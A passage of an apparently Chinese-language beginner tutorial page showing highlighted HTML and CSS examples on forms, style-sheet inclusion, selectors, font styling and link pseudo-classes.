class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="按钮表单"><a href="#按钮表单" class="headerlink" title="按钮表单"></a>按钮表单</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--表单标签 form--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--     要加 enctype 为 multipart/form-data 否则无法提交文件！--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">action</span>=<span class="string">"success.html"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    搜索框 search--&gt;</span></span><br><span class="line">    百度一下<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"search"</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 用get 提交 地址栏上会有信息 用post 则会隐藏此信息--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 而 action 里的地址则会在提交后跳转到此页面--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">action</span>=<span class="string">"success.html"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    账号 text | 名字为 user | 默认值为 张三 | 尺寸size 为 20 | 提交长度上限 10  --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>账号:<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"user"</span>  <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">size</span>=<span class="string">"20"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span> <span class="attr">placeholder</span>=<span class="string">"请输入账号"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    密码 password--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>密码:<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"123456"</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">size</span>=<span class="string">"20"</span> <span class="attr">maxlength</span>=<span class="string">"10"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    年龄--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>年龄:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    最大值 最小值  |   类型为数字  | 最大值为 100 | 最小值为 0 | 默认值为 20--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>最大值最小值测试:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"number"</span> <span class="attr">max</span>=<span class="string">"100"</span> <span class="attr">min</span>=<span class="string">"0"</span> <span class="attr">value</span>=<span class="string">"20"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    emil--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>邮箱:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"email"</span>/&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    隐藏域  用于 程序员测试--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    文本域--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>简介：<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">"20"</span> <span class="attr">rows</span>=<span class="string">"5"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    身高--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>身高:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"range"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- radio 为单选框  |    因为两个单选框的name 都为 sex 为一组 所以在选择时只能选一个--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    checked 为默认选中属性  选择了男 所以默认为男 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>性别:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">checked</span> /&gt;</span>男 <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span>/&gt;</span>女 <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--复选框--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span> 爱好:</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"hobby"</span> /&gt;</span>篮球</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"hobby"</span> /&gt;</span>羽毛球</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"hobby"</span> /&gt;</span>桌球</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"hobby"</span> <span class="attr">checked</span>/&gt;</span>足球</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"hobby"</span> /&gt;</span>乒乓球</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    列表--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>省份:<span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>请选择<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>银川<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>北京<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>上海<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>广州<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span>&gt;</span>新疆<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    按钮--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span>   <span class="attr">value</span>=<span class="string">"普通按钮"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    禁用 按钮加 disabled--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span>   <span class="attr">disabled</span> <span class="attr">value</span>=<span class="string">"普通按钮"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    只读 按钮加 readonly--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span>   <span class="attr">readonly</span> <span class="attr">value</span>=<span class="string">"普通按钮"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    重置按钮 让表单内容重置  不过按钮只读没有什么意义--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"reset"</span> <span class="attr">value</span>=<span class="string">"重置按钮"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    提交按钮 submit--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    图片按钮--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    将他重新用form 然后跳转为 选择头像界面--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">src</span>=<span class="string">"png/mengjing.png"</span> <span class="attr">width</span>=<span class="string">"250px"</span> <span class="attr">height</span>=<span class="string">"200px"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    文件上传 头像上传--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>头像上传:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"Img"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!----&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    内部样式--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">h1</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">40px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    外部样式表的引入 链接式--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    使用外部样式表 | 链接 |非必填--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"Text01_css.css"</span> <span class="attr">type</span>=<span class="string">"text/css"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    外部样式表的引入 导入式--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    @导入 | url（地址）--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="keyword">@import</span> <span class="string">"经典练习/Text01_css.css"</span>;</span></span><br><span class="line"><span class="language-css">    <span class="comment">/*    @import url(Text01_css.css)*/</span></span></span><br><span class="line"><span class="language-css">    <span class="comment">/*    完整规范写法*/</span></span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 加多个样式用 ; 隔开--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--行内样式 内联样式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color: green; font-size: 30px;"</span>&gt;</span>教育改变生活<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--内部样式表 只要是h标签都会被改变相同的样式--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 就近原则 当内联有 那么外部样式被覆盖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"color: green"</span>&gt;</span>教育改变生活<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>教育改变生活<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>教育改变生活<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>教育改变生活<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--外部样式表--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>教育改变生活<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="ID选择器"><a href="#ID选择器" class="headerlink" title="ID选择器"></a>ID选择器</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>选择器<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    权限大小:ID选择器 &gt; 类选择器 &gt; 标签选择器--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    类选择器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.lol</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: green;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="comment">/*ID选择器*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#lol2</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: palevioletred;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--通过class 类名去设置样式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"lol"</span>&gt;</span>英雄联盟<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--通过ID 名去设置样式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"lol2"</span>&gt;</span>亚瑟<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="迭代选择器"><a href="#迭代选择器" class="headerlink" title="迭代选择器"></a>迭代选择器</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>高级选择器<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">li</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> red solid;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="comment">/*选中 ul 下的所有li标签*/</span></span></span><br><span class="line"><span class="language-css">        <span class="comment">/*后迭选择器*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">ul</span> <span class="selector-tag">li</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: green;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="comment">/*子迭选择器*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">ul</span>&gt;<span class="selector-tag">li</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: red;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    <span class="comment">/*    相邻兄弟选择器   BUG*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#text</span> + <span class="selector-tag">li</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: black;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    <span class="comment">/*    通用兄弟选择器*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#text</span> ~ <span class="selector-tag">li</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: bisque;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span>1</span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"text"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="CSS字体"><a href="#CSS字体" class="headerlink" title="CSS字体"></a>CSS字体</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>选中标签<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        spen{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: blue;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: 微軟正黑體;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-style</span>: italic;</span></span><br><span class="line"><span class="language-css">        <span class="comment">/*    粗细*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bolder;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.x1</span>{</span></span><br><span class="line"><span class="language-css">            <span class="comment">/*风格 粗细 大小 字体*/</span></span></span><br><span class="line"><span class="language-css">            <span class="attribute">font</span>:italic bolder <span class="number">20px</span> <span class="string">"方正姚体"</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: crimson;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">p</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: line-through;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">vertical-align</span>: bottom;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-shadow</span>: <span class="number">1px</span> <span class="number">2px</span> <span class="number">1px</span> green;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#x2</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-shadow</span>: <span class="number">1px</span> <span class="number">2px</span> <span class="number">1px</span> cornflowerblue;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: 微軟正黑體;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"x1"</span>&gt;</span>今天<span class="tag">&lt;/<span class="name">span</span>&gt;</span>的天气<span class="tag">&lt;<span class="name">spen</span>&gt;</span>非常冷<span class="tag">&lt;/<span class="name">spen</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>你好世界<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>你好世界<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"png/1669804543.893689_SEED_989475991.png"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"x2"</span>&gt;</span>本人照片<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><h2 id="链接-状态-CSS"><a href="#链接-状态-CSS" class="headerlink" title="链接 状态 CSS"></a>链接 状态 CSS</h2><figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>链接未释放<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="comment">/*点击时*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span><span class="selector-pseudo">:link</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: cornflowerblue;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="comment">/*移动到时*/</span></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span><span class="selector-pseudo">:hover</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: orange;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span><span class="selector-pseudo">:active</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: aquamarine;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">a</span><span class="selector-pseudo">:visited</span>{</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: yellow;</span></span><br><span class="line"><span class="language-css">        }</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://www.baidu.com"</span>&gt;</span>点击链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 